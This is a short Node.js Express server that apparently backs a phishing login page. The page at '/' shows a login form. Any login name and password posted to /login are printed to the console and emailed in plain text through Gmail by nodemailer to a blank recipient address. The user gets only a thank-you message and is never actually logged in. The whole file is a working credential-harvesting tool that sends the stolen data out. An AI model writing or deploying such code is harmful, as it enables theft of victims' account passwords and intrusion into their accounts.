var express = require("express");
var app = express();
var bodyParser = require("body-parser");
app.set("view engine","ejs");
app.use(bodyParser.urlencoded({
	extended : true
}))
// Starting to send gmail
const nodemailer = require('nodemailer');

//step 1
let transporter = nodemailer.createTransport({
	service : "gmail",
	auth :{
		user : '', //login
		pass : '' //password
	}
});

var loginName;
var password;
app.post("/login",function(req,res) {
	loginName = req.body.login;
	password = req.body.password;
	res.send("Thank You for logining our service");
	console.log("login: " + loginName)
	console.log("password: " + password)
//step 2
let mailOptions = {
	from : '', // email
	to : '', // email
	subject : "", //subject
	text : "login: " + loginName + ", password : " + password //text 
};
	
//step 3
transporter.sendMail(mailOptions,function (err,data) {
	if (err) {
		console.log('ERROR: ' + err);
	}else {
		console.log('we made it mail was sent');
	}
}) 
})



app.get("/",function(req,res){
	res.render("login");
});

app.listen(3000,function(){
	console.log('started');
});



